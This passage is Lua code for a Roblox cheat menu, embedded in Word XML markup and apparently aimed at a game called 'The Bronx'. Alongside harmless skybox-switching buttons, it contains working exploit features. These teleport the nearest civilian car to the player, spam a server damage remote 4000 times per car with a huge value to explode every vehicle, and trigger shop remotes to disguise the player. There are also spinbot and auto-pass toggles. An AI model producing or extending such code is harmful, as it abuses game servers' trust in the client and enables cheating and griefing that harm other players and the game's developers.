        <w:t xml:space="preserve">        Rt = "rbxassetid://111749399946832",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        Up = "rbxassetid://96933043812138"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    })</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>end})</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>-- Realistic Night Time</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Skysection:button({name = "Night Time", callback = function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    setSky({</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        Bk = "rbxassetid://155624722",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        Dn = "rbxassetid://155624727",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        Ft = "rbxassetid://155624730",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        Lf = "rbxassetid://155624736",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        Rt = "rbxassetid://155624742",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        Up = "rbxassetid://155624749"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    })</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>end})</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">-- Pink </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Skysection:button({name = "Pink Clouds", callback = function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    setSky({</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        Bk = "rbxassetid://11555017034",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        Dn = "rbxassetid://11555013415",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        Ft = "rbxassetid://11555010145",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        Lf = "rbxassetid://11555006545",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        Rt = "rbxassetid://11555000712",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        Up = "rbxassetid://11554996247"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    })</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>end})</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>-- ai sky</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Skysection:button({name = "Purple Galaxy", callback = function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    setSky({</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        Bk = "rbxassetid://159454299",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        Dn = "rbxassetid://159454296",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        Ft = "rbxassetid://159454293",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        Lf = "rbxassetid://159454286",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        Rt = "rbxassetid://159454300",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        Up = "rbxassetid://159454288"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    })</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>end})</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>-- Sunset</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Skysection:button({name = "Sunset", callback = function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    setSky({</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        Bk = "rbxassetid://15502525195",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        Dn = "rbxassetid://15502522797",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        Ft = "rbxassetid://15502524520",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        Lf = "rbxassetid://15502522129",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        Rt = "rbxassetid://15502523711",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        Up = "rbxassetid://15502526102"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    })</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>end})</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">       --[[ Bk = "rbxassetid://15470129182",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        Dn = "rbxassetid://15470130287",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        Ft = "rbxassetid://15470132018",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        Lf = "rbxassetid://15470133980",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        Rt = "rbxassetid://15470136370",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        Up = "rbxassetid://15470139181"]]</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>-- summer pro</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Skysection:button({name = "Cloudy Summer", callback = function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    setSky({</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        Bk = "rbxassetid://17838127289",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        Dn = "rbxassetid://17838129609",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        Ft = "rbxassetid://17838144422",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        Lf = "rbxassetid://17838131484",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        Rt = "rbxassetid://17838148822",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        Up = "rbxassetid://17838140709"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    })</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>end})</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                ExtraTabColumn = ExtraTab:column({})</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                local ExtraSection = ExtraTabColumn:section({name = "Extra Settings", side = "left", size = 1.0135})   </w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>--[[ExtraSection:button({</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    name = "Steal, Bring Nearest Car",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    callback = function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        local player = game:GetService("Players").LocalPlayer</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        local char = player.Character or player.CharacterAdded:Wait()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        local hrp = char:WaitForChild("HumanoidRootPart")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        local hum = char:FindFirstChildWhichIsA("Humanoid")</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        local nearestCar</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        local nearestDist = math.huge</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        for _, obj in ipairs(workspace:GetDescendants()) do</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            if obj:IsA("Model") and obj:FindFirstChild("DriveSeat") then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                local seat = obj:FindFirstChild("DriveSeat")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                if seat and not seat.Occupant then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    local primary = obj.PrimaryPart or seat</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    if primary then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        local dist = (primary.Position - hrp.Position).Magnitude</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        if dist &lt; nearestDist then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            nearestDist = dist</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            nearestCar = obj</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        end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if not nearestCar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"No Empty Car Found Near You!",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local seat = nearestCar:FindFirstChild("DriveSeat")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        if not seat then return end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        hum.Sit = false</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        task.wait(0.1)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        hum:MoveTo(seat.Position + Vector3.new(0, 2, 0))</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        task.wait(0.15)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        seat:Sit(hum)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        local primary = nearestCar.PrimaryPart or seat</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        local TweenService = game:GetService("TweenService")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        local tweenInfo = TweenInfo.new(0.5, Enum.EasingStyle.Linear)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        local goal = {CFrame = hrp.CFrame + Vector3.new(0,5,0)}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        local tween = TweenService:Create(primary, tweenInfo, goal)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        tween:Play()</w:t>
      </w:r>
    </w:p>
    <w:p/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"Successfully Stole Car!",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            lifetime = 5</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        })</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>})</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Steal Car ennd]]</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>-- bring car (working)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>local function GetNearestCar(hrp)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    local CivCars = workspace:FindFirstChild("CivCars")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    if not CivCars then return nil end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    local nearestCar = nil</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    local nearestDist = math.huge</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    for _, car in ipairs(CivCars:GetChildren()) do</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        if not car:IsA("Model") then continue end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        local seat = car:FindFirstChild("DriveSeat")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        if not seat then continue end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        if seat.Occupant then continue end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        if not car.PrimaryPart then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            local body = car:FindFirstChild("Body")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            if body and body:FindFirstChild("#Weight") then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                car.PrimaryPart = body["#Weight"]</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            else</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                car.PrimaryPart = seat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if not car.PrimaryPart then continue end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        local dist = (car.PrimaryPart.Position - hrp.Position).Magnitude</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        if dist &lt; nearestDist then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            nearestDist = dist</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            nearestCar = car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return nearestCar</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>ExtraSection:button({</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    name = "Steal, Bring Nearest Car",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    callback = function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        local Players = game:GetService("Players")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        local Player = Players.LocalPlayer</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        local char = Player.Character</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        if not char then return end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        local hrp = char:FindFirstChild("HumanoidRootPart")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        local hum = char:FindFirstChildWhichIsA("Humanoid")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        if not hrp or not hum then return end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        local car = GetNearestCar(hrp)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        if not car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"Couldn't Find An Available Car!",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local seat = car:FindFirstChild("DriveSeat")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        if not seat then return end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        seat:Sit(hum)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        task.wait(0.1)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        hum.Sit = false</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        hum.Jump = true</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        car:SetPrimaryPartCFrame(</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            hrp.CFrame * CFrame.new(0, 0, -6)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        )</w:t>
      </w:r>
    </w:p>
    <w:p/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"Car Delivered!",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            lifetime = 5</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        })</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>})</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>-- end bring car</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>ExtraSection:button({</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    name = "Explode All Cars - Hold Gun",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    callback = function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        local LocalPlayer = game.Players.LocalPlayer</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        local ReplicatedStorage = game:GetService("ReplicatedStorage")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        local gun = LocalPlayer.Character and LocalPlayer.Character:FindFirstChildWhichIsA("Tool")</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        if not gun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"Hold a gun first!",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                lifetime = 4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local civCars = workspace:FindFirstChild("CivCars")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        if not civCars then return end</w:t>
      </w:r>
    </w:p>
    <w:p/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"Exploding all Vehicles...",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            lifetime = 5</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        })</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        local count = 0</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        for _, car in civCars:GetChildren() do</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            if car:IsA("Model") then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                count += 1</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                task.spawn(function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    local success, part = pcall(function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        return car:FindFirstChildWhichIsA("BasePart") or car.PrimaryPart</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    end)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    if not success or not part then return end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    for i = 1, 4000 do</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        pcall(function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            ReplicatedStorage.InflictCar:InvokeServer(</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                gun,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                car,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                part,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                9e50</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            )</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        end)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task.wait(6)</w:t>
      </w:r>
    </w:p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count .. " Vehicles Exploded!",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            lifetime = 5</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        })</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>})</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                           </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                ExtraSection:button({name = "Hide Identity.", callback = function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                local Player = game.Players.LocalPlayer</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                local Backpack = Player:WaitForChild("Backpack")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                local ReplicatedStorage = game:GetService("ReplicatedStorage")</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                ReplicatedStorage:WaitForChild("ShopRemote"):InvokeServer("Shiesty")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                ReplicatedStorage:WaitForChild("ShopRemote"):InvokeServer("BlackGloves")</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                task.wait(.1)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                local Shiesty = Backpack:FindFirstChild("Shiesty") or Player.Character:FindFirstChild("Shiesty")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                if Shiesty then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                Player.Character.Humanoid:EquipTool(Shiesty)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                task.wait(.1)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                local Remote = Shiesty:FindFirstChild("RemoteEvent")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                if Remote then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                Remote:FireServer()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                 task.wait(.1)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                 Player.Character.Humanoid:UnequipTools()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                 end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                 task.wait(.1)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                 local Gloves = Backpack:FindFirstChild("BlackGloves") or Player.Character:FindFirstChild("BlackGloves")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                 if Gloves then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                 Player.Character.Humanoid:EquipTool(Gloves)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                 task.wait(.1)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                 Gloves:Activate()</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                 task.wait(.1)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                 Player.Character.Humanoid:UnequipTools()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                 end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                 end})  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                 </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                ExtraSection:toggle({type = "toggle", name = "Auto Pass", flag = "autopass", default = false, callback = function(state)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Config.TheBronx.autopass = state</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                end})                  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                 </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                ExtraSection:toggle({type = "toggle", name = "Full Bright", flag = "Fullbright", default = false, callback = function(state)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Config.WorldVisuals.Fullbright = state</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                end})   </w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                ExtraSection:toggle({type = "toggle", name = "Anti AFK", flag = "antiafk", default = false, callback = function(state)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Config.TheBronx.antiafk = state</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                end})                 </w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                ExtraSection:toggle({type = "toggle", name = "Spinbot", flag = "spinbotter", default = false, callback = function(state)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Config.TheBronx.spinbotter = state</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                end})                </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                ExtraSection:toggle({type = "toggle", name = "Set Fov", flag = "tb3_fov", default = false, callback = function(state)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Config.TheBronx.tb3_fov = state</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                end})</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                ExtraSection:slider({name = "Spinbot Speed", flag = "spinbotterspeed", min = 5, max = 45, default = 20, suffix = "%", callback = function(state)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
